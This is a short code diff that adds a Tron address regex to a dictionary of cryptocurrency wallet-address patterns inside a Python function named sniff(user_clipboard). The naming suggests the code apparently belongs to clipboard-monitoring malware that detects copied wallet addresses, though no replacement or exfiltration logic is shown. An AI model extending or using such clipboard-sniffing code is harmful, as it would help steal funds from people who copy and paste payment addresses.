@@ -61,6 +61,7 @@ def sniff(user_clipboard):
         "doge": "^D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}$",
         "ada": "^D[A-NP-Za-km-z1-9]{35,}$",
         "lite": "^[LM3][a-km-zA-HJ-NP-Z1-9]{25,34}$",
+        "tron": "^T[a-zA-Z0-9]{33}$",
         "dot": "^[1-9A-HJ-NP-Za-km-z]*$",
     }
 
